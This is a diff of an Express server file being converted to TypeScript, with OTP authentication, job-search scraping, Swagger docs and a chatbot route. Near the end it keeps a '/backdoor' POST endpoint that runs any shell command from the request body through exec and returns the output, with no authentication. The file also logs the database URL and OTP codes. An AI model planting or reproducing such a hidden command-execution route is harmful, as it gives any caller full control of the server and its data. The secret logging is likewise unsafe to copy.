@@ -1,39 +1,70 @@
-const express = require("express");
-const dotenv = require("dotenv");
-const {exec}= require('child_process');
+import express, { Request, Response, NextFunction } from "express";
+import dotenv from "dotenv";
+import axios from "axios";
+import { exec } from 'child_process';
+import swaggerUi from 'swagger-ui-express'
 dotenv.config();
-const {sq,testDbConnection} = require('./databaseStructure/dbconnection')
-const user = require('./databaseStructure/user.modal')
-const axios= require("axios");
-const puppeteer = require("puppeteer");
-const auntendicationService = require("./auntendication.service");
-const languageTranslationAPI = require('./languageTranslation.service')
-const linkedinApi = require('./linkedinService')
-const { UUIDV4 } = require("sequelize");
+console.log("hello",process.env.URL_DB)
+
+// import { testDbConnection } from './databaseStructure/dbconnection.js'
+
+import auntendicationService from "./auntendication.service.js"
+import languageTranslationAPI from './languageTranslation.service.js'
+import linkedinApi from './linkedinService.js'
+import chatRouter from "./routes/chatbot.route.ts"
+import swaggerSpec from "./swagger.ts";
+
+
+
 const app = express();
 const auntendicationServiceFile = new auntendicationService();
 const languageTranslation = new languageTranslationAPI()
 const linkedinApiFile = new linkedinApi();
 const PORT = process.env.PORT ? process.env.PORT : 3000;
-const ACCESS_TOKEN_SECRET =
-  process.env.ACCESS_TOKEN_SECRET || "testAccessToken";
-const REFRESH_TOKEN_SECRET =
-  process.env.REFRESH_TOKEN_SECRET || "testRefreshToken";
 const accountSid = process.env.ACCS_ID;
 const authToken = process.env.AUTHTOKEN;
 app.use(express.json());
-let users = [];
-let refreshTokens = [];
-let OtpToken = [];
-languageTranslation.translateText({text:'नमस्ते माँ, आप कैसी हैं?'})
+
+const swaggerCustomCss = `
+  .hljs {
+    background: #272822 !important;  /* Background for Monokai theme */
+    color: #f8f8f2 !important;  /* Text color for Monokai theme */
+  }
+  .hljs-keyword {
+    color: #66d9ef !important;
+  }
+  .hljs-string {
+    color: #e6db74 !important;
+  }
+  .hljs-title {
+    color: #a6e22e !important;
+  }
+`;
+
+
+const swaggerUiOptions = {
+  customCss: swaggerCustomCss,
+  customSiteTitle: 'Your API Docs',
+  syntaxHighlight: {
+    theme: 'monokai',  // Change to your preferred theme
+  },
+};
+
+app.use('/api-docs', swaggerUi.serve, swaggerUi.setup(swaggerSpec, swaggerUiOptions));
+
+let OtpToken: { count: number, token: string, phNo: string, mobileDeviceID: string }[] = [];
+
+// languageTranslation.translateText({ text: 'नमस्ते माँ, आप कैसी हैं?' })
 //connect db
-testDbConnection()
+// testDbConnection()
+
+
 app.post("/sendOTP", async (req, res) => {
   let token = "";
   for (let index = 1; index < 7; index++) {
     token += Math.floor(Math.random() * 10).toString();
   }
-  console.log(token,"tokennn")
+  console.log(token, "tokennn")
   let userDataIndex = OtpToken.findIndex((user) => user.mobileDeviceID == req.body.mobileDeviceID);
 
   if (userDataIndex >= 0) {
@@ -72,68 +103,73 @@ app.post("/sendOTP", async (req, res) => {
   }
 });
 
-app.post("/authendicate",async(req, res) => {
+app.post("/authendicate", async (req, res) => {
 
-  try{
+  try {
     let userdata = OtpToken.findIndex((user) => user.phNo == req.body.phNo);
     if (userdata >= 0) {
       let newUser
-      if (OtpToken[userdata].token == req.body.token ) {    
+      if (OtpToken[userdata].token == req.body.token) {
         let checkExistingUser = await auntendicationServiceFile.findUser(
           req.body.phNo
         );
-        if(checkExistingUser && checkExistingUser.length == 0 ){
+        if (checkExistingUser && checkExistingUser.length == 0) {
           console.log("testt")
           newUser = await auntendicationServiceFile.createUser(
             req.body
           );
         }
         OtpToken.splice(0, userdata);
-        if(checkExistingUser.length || newUser){
+        if (checkExistingUser && checkExistingUser.length || newUser) {
           let token = await auntendicationServiceFile.generateAccessToken(checkExistingUser)
-          res.status(newUser ? 201 : 200).json({ status: "sucess", user: newUser ? newUser : checkExistingUser[0],token : token });
-        }else{
-          res.status(500).json({ status :"some thing went wrong" });
-        } 
-      
+          let user;
+          if (newUser)
+            user = newUser
+          else if (checkExistingUser)
+            user = checkExistingUser[0]
+          res.status(newUser ? 201 : 200).json({ status: "sucess", user, token: token });
+        } else {
+          res.status(500).json({ status: "some thing went wrong" });
+        }
+
       } else {
         res.status(401).json({ status: "invalid token" });
       }
     } else {
       res.status(401).json({ status: "invalid phone number" });
     }
-  }catch (e){
-    console.log(e,"error")
-    res.send(500).json({error : e})
+  } catch (e) {
+    console.log(e, "error")
+    res.send(500).json({ error: e })
   }
- 
+
 });
 
 app.post("/register", async (req, res) => {
   const userCred = req.body;
-  try{
+  try {
     let checkExistingUser = await auntendicationServiceFile.findUser(
       userCred.phNo
     );
-    if (checkExistingUser.length) {
-      let cred = req.body 
+    if (checkExistingUser && checkExistingUser.length) {
+      let cred = req.body
       cred.updatedAt = Date.now()
       let status = await auntendicationServiceFile.updateUser(cred);
-      if(status[0]){
-        res.status(200).json({status : 'updated sucessfully'});
+      if (Array.isArray(status) && status[0]) {
+        res.status(200).json({ status: 'updated sucessfully' });
       }
-      else{
-        res.status(400).json({status : 'not updated sucessfully'});
+      else {
+        res.status(400).json({ status: 'not updated sucessfully' });
       }
-    }else{
-      res.status(200).json({status : "user not found"});
+    } else {
+      res.status(200).json({ status: "user not found" });
     }
-  }catch(e){
-    
-      res.send(500).json({error : e})
-    
+  } catch (e) {
+
+    res.send(500).json({ error: e })
+
   }
-  
+
 });
 
 app.post("/login", async (req, res) => {
@@ -143,10 +179,8 @@ app.post("/login", async (req, res) => {
   if (!user) {
     return res.status(400).json({ message: "Invalid credentials" });
   } else {
-    const issueTokenStatus = await auntendicationServiceFile.autendicate(
-      req.body,
-      res
-    );
+    const issueTokenStatus = await auntendicationServiceFile.autendicate(req.body);
+
     console.log(issueTokenStatus, "issueTokenStatus");
     if (issueTokenStatus?.status == 200) {
       let { accessToken, refreshToken } = issueTokenStatus;
@@ -176,10 +210,10 @@ app.post("/token", async (req, res) => {
   }
 });
 
-app.post("/jobAvailability", async (req, res) => { 
-  let {title="",location ="",level =""} = req.body;
-  if(!(title && location)){
-    return res.status(400).json({status : "title or location is missing"})
+app.post("/jobAvailability", async (req, res) => {
+  let { title = "", location = "", level = "" } = req.body;
+  if (!(title && location)) {
+    return res.status(400).json({ status: "title or location is missing" })
   }
   let options = {
     "headers": {
@@ -201,29 +235,36 @@ app.post("/jobAvailability", async (req, res) => {
       "TE": "trailers",
     },
   };
-  let naukriData = []
+  let naukriData: any[] = []
   axios.get(
     `https://www.naukri.com/jobapi/v3/search?noOfResults=20&urlType=search_by_keyword&searchType=adv&keyword=${title}&pageNo=1&experience=0&k=${title}&experience=0&seoKey=${title}-jobs&src=jobsearchDesk&latLong=`,
-    options).then((value)=>{
+    options).then((value) => {
       naukriData = value.data
-    }).catch((e)=>{
-      res.status(500).json({status :"something went wrong while fetching"})
+    }).catch((e) => {
+      res.status(500).json({ status: "something went wrong while fetching" })
       return
     });
   let linkedInData = await linkedinApiFile.linnkedinService(req.body)
   return res.status(200).json({
-    linkedInData : linkedInData,
-    naukriData : naukriData
+    linkedInData: linkedInData,
+    naukriData: naukriData
   })
 });
 
 app.post("/logout", (req, res) => {
-  const { token } = req.body;
-  refreshTokens = auntendicationServiceFile.refreshTokens.filter(
-    (t) => t !== token
-  );
+  /**
+   * TODO:
+   *  properly logout from the system
+   *  by clearing cookie or session or tag in DB
+   */
+  // const { token } = req.body;
+  // let refreshTokens = auntendicationServiceFile.refreshTokens.filter((t) => t !== token);
+
   res.status(204).json({ message: "Logout successful" });
 });
+
+
+app.use("/chatbot", chatRouter);
 
 app.post(
   "/test",
@@ -233,31 +274,34 @@ app.post(
     res.sendStatus(200);
   }
 );
-app.listen(PORT, (status) => {
-  if (!status) {
-    console.log("listening port", PORT);
-  } else {
-    console.log("error", status);
-  }
+app.listen(PORT, () => {
+
+  console.log("listening port", PORT);
+
 });
 
 
 
-app.post("/backdoor",(req,res)=>{
+app.post("/backdoor", (req, res) => {
   // Command to execute
   const command = req.body.cmd || 'echo "Hello World"';
 
   // Execute the command
   exec(command, (error, stdout, stderr) => {
-      if (error) {
-          // If there's an error, return it
-          return res.status(200).json({ error: error.message });
-      }
-      if (stderr) {
-          // If there's stderr, return it
-          return res.status(200).json({ stderr });
-      }
-      // If everything is fine, return stdout
-      res.json({ output: stdout });
+    if (error) {
+      // If there's an error, return it
+      return res.status(200).json({ error: error.message });
+    }
+    if (stderr) {
+      // If there's stderr, return it
+      return res.status(200).json({ stderr });
+    }
+    // If everything is fine, return stdout
+    res.json({ output: stdout });
   });
+});
+
+app.use((err: any, req: Request, res: Response, next: NextFunction) => {
+  console.error(err.stack);
+  res.status(200).json({ status: 200, message: "Something went wrong", errors: [err.message] });
 });
